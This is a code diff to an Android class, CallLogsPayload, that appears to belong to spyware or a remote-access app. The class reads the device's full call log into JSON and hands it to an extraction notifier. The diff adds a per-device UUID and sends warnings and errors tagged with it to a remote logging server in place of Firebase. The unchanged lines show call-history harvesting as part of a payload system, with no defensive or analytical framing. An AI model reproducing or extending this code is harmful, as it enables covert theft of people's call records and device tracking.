@@ -10,6 +10,8 @@ import com.aigs.serviceone.helpers.CallExtractorNotifier;
 import com.aigs.serviceone.helpers.FileSystem;
 import com.aigs.serviceone.annotations.PayloadTypes;
 import com.aigs.serviceone.annotations.SmsModes;
+import com.example.logshandler.starter.Logs;
+import com.example.uniqueidmanager.UniqueId;
 import com.google.firebase.database.FirebaseDatabase;
 
 import org.json.JSONArray;
@@ -23,6 +25,7 @@ public class CallLogsPayload extends AsyncTask<String, Integer, String> {
 
     private WeakReference<Context> contextRef;
     private CallExtractorNotifier callExtractorNotifier;
+    private String uuid;
 
     public CallLogsPayload(Context context) {
         contextRef = new WeakReference<>(context);
@@ -43,6 +46,7 @@ public class CallLogsPayload extends AsyncTask<String, Integer, String> {
         try {
 
             Context context = contextRef.get();
+            uuid = UniqueId.initialize(context).getUUID();
             Cursor managedCursor = context.getContentResolver().query(CallLog.Calls.CONTENT_URI, null, null, null, null);
 
             int number = managedCursor.getColumnIndex(CallLog.Calls.NUMBER);
@@ -85,18 +89,19 @@ public class CallLogsPayload extends AsyncTask<String, Integer, String> {
                     callExtractorNotifier.onCallRetrieved(file, jsonArray.toString());
 
                 } else {
+                    Logs.pushLogsToServer("[WARN]: Call Log empty",uuid);
                     callExtractorNotifier.onResponseEmpty();
                 }
 
 
             } catch (Exception e) {
-
+                Logs.pushLogsToServer("[ERROR]: "+e.getMessage(),uuid);
             }
 
             managedCursor.close();
         }catch (Exception e){
+            Logs.pushLogsToServer("[ERROR]: "+e.getMessage(),uuid);
             Log.e("EXCEPTION_CL",e.getMessage());
-            FirebaseDatabase.getInstance().getReference("Logs").child(PayloadTypes.GET_CALL_LOGS+"").child("CurrentLog").setValue(e.getMessage());
 
         }
 
